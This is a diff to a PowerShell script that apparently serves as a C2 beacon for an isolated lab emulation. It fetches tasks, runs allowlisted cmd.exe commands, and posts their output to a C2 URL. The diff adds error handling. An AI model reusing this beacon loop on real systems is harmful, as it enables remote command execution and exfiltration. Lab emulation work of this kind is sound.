@@ -18,6 +18,8 @@ param(
     [switch]$Once
 )
 $ErrorActionPreference = 'Stop'
+# keep native stderr (e.g. a failing task command) from honoring ErrorActionPreference
+$PSNativeCommandUseErrorActionPreference = $false
 
 function Get-IniValue {
     param([string]$Path, [string]$Section, [string]$Key)
@@ -76,9 +78,17 @@ for ($i = 0; $i -lt $count; $i++) {
     $task = ($taskResp.Content | ConvertFrom-Json).task
     $cmd = $taskMap[$task]
     if (-not $cmd) { $cmd = $taskMap['T-NOOP'] }
-    # bounded benign execution of an allowlisted command
-    $result = & cmd.exe /c $cmd 2>&1 | Out-String
+    # bounded benign execution of an allowlisted command;
+    # a task command may legitimately fail (e.g. no browser service in an
+    # isolated lab) - capture its stderr as the result instead of aborting.
+    $result = ''
+    try {
+        $result = (& cmd.exe /c $cmd 2>&1 | Out-String)
+    } catch {
+        $result = "task error: $($_.Exception.Message)"
+    }
     if ($result.Length -gt $cap) { $result = $result.Substring(0, $cap) }
+    if ([string]::IsNullOrWhiteSpace($result)) { $result = "(no output)" }
     $body = [System.Text.Encoding]::UTF8.GetBytes($result)
     Invoke-WebRequest -Method POST -Uri "$c2Url/result?session=$token&task=$task" -Body $body -UseBasicParsing -TimeoutSec 10 | Out-Null
     Start-Sleep -Seconds $sleep
